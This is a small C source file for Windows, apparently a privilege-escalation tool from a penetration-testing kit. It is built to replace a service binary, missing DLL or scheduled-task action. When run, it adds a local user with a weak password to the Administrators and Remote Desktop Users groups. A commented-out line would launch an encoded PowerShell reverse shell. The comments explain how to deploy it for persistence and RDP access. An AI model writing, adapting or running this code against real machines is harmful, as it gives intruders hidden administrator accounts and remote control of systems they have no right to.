// x86_64-w64-mingw32-gcc adduser.c -o <binary-name>
// This binary will add "added_user" : password and add them to the Remote Desktop Users group for remote GUI access via RDP
// uncomment the powershell reverse shell if you would like access as the user running the service
// This binary can be used to replace service binaries, missing service DLLs, or scheduled task actions 
#include <stdlib.h>

int main() {
	int i;

	i = system("net user added_user password /add");
	i = system("net localgroup Administrators added_user /add");
	i = system("net localgroup \"Remote Desktop Users\" added_user /add");
	/*i = system("powershell.exe -ep bypass -NoP -EncodedCommand <encoded-command>");*/

	return 0;
}
